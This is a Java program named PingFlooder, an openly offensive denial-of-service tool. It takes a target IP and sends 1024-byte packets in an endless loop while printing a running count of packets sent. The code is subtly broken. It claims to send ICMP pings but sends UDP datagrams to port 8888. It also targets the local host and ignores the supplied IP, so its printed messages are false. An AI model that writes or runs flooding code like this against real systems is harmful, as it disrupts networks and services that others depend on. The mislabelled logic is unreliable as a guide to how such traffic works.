import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

public class PingFlooder {

    public static void main(String[] args) {
        if (args.length != 1) {
            System.out.println("Usage: java PingFlooder <target_ip>");
            System.exit(1);
        }

        String targetIp = args[0];
        System.out.println("Flooding " + targetIp + " with ICMP ping packets.");

        try {
            InetAddress targetAddress = InetAddress.getLocalHost();
            DatagramSocket socket = new DatagramSocket();
            int x = 0;
            while (true) {

                byte[] data = new byte[1024];
                DatagramPacket packet = new DatagramPacket(data, data.length, targetAddress, 8888);


                socket.send(packet);

                x++;
                System.out.println("Flooding " + targetIp + " with ICMP ping packets.  " + x +"  Times.");

            }

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}